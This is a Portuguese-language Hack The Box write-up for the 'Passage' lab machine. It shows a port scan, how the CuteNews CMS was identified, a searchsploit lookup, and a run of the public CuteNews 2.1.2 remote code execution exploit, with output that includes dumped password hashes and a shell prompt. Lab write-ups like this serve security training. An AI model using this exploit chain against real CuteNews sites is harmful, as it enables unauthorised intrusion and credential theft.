---
published: true
author: EEP0x10
date: '2020-11-04'
categories:
  - SecInfo
  - Writeup
tags:
  - Writeup
  - HTB
---
![Logo](https://www.hackthebox.eu/storage/avatars/ec88bbe570fd512ab370208e5139bb41.png){: width="240" class="right"}
## Informações

|:-----------------------------|:-------------|
| Sistema Operacional          | Linux        |
| Dificuldade                  | Médio        |
| Pontos                       | 30           |
| Lançamento                   | 05/09/2020   | 
| IP                           | 10.10.10.206 |
| Criador                      | [ChefByzen](https://www.hackthebox.eu/home/users/profile/140851) |


> Sistema Usado: Windows 10 + WSL2 Ubuntu

## Hosts
Adicionar o ip e o domínio no arquivos "hosts" 

Windows: `C:\Windows\System32\drivers\etc\hosts`

Linux: `/etc/hosts`

> É necessário **admin** / **root** para editar o arquivo

```
10.10.10.206	passage.htb
```

> **Dica**: Em windows pode-se usar o ***notepad++*** para editar esse arquivo, pois o mesmo consegue salvar / editar com permissões administrativas. Enquanto em linux, é necessário editar o arquivo com **sudo** nano /etc/hosts .


## Scan
Ferramenta usada: [Rustscan](https://github.com/RustScan/RustScan)
```terminal
$ rustscan passage.htb -- -Pn -sV
```
Resultado 1 : Varrimento de todas as portas
```terminal
Open 10.10.10.206:22
Open 10.10.10.206:80
```
Resultado 2 : Nmap nas portas abertas
```terminal
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
```

> O **rustscan** é usado com a função de ***varrer todas as portas de um host rapidamente***, e em seguida, **ele mesmo executa o nmap**, utilizando os parâmetros definidos após o "**--**", realizando nesse caso um Service / Version Scan (-sV) nas portas abertas.

## Enumeração

Acessar a url do laboratório na porta 80

`http://passage.htb`


![Sem título.png](/assets/img/sample/passage1.png)

Ao acessar a aplicação web, no canto inferior do site é possível verificar que a aplicação usa o CMS `Cute News`.

![Sem título2.png](/assets/img/sample/passage3.png)


CMS: `https://cutephp.com/`

A partir da descoberta do CMS, é possível pesquisar exploits referentes a ele.

```terminal
$ searchsploit cute php remote

CuteNews 0.88 - 'comments.php' Remote File Inclusion
CuteNews 0.88 - 'search.php' Remote File Inclusion
CuteNews 0.88 - 'shownews.php' Remote File Inclusion
CuteNews 1.1.1 - 'html.php' Remote Code Execution 
CuteNews 1.4.0 - Shell Injection / Remote Command Execution
CuteNews 1.4.1 - 'categories.mdu' Remote Command Execution  
CuteNews 1.4.1 - Shell Injection / Remote Command Execution 
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)
CuteNews 2.1.2 - Remote Code Execution 
CuteNews aj-fork - 'path' Remote File Inclusion
CuteNews aj-fork 167f - 'cutepath' Remote File Inclusion
```

O Exploit que será utilizado é o CuteNews 2.1.2 - Remote Code Execution php/webapps/48800.py

`https://www.exploit-db.com/exploits/48800`

```terminal
$ searchsploit -m 48800
```

## Exploitation 

Após baixar o exploit, basta executá-lo

```terminal
$ python3 48800.py

           _____     __      _  __                     ___   ___  ___
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/
                                ___  _________
                               / _ \/ ___/ __/
                              / , _/ /__/ _/
                             /_/|_|\___/___/




[->] Usage python3 expoit.py

Enter the URL> http://passage.htb/

================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: M9nCw3HMKX and password: M9nCw3HMKX

=======================================================
Sending Payload
=======================================================
signature_key: 3a888bb1d42e1ccdf617b140ebed5d26-M9nCw3HMKX
signature_dsi: 07be6b75ad23b596c739ed786aa021ca
logged in user: M9nCw3HMKX
============================
Dropping to a SHELL
============================

command >
```

Pegamos a shell

![RCE](https://media.makeameme.org/created/rce-rce-everywhere.jpg)
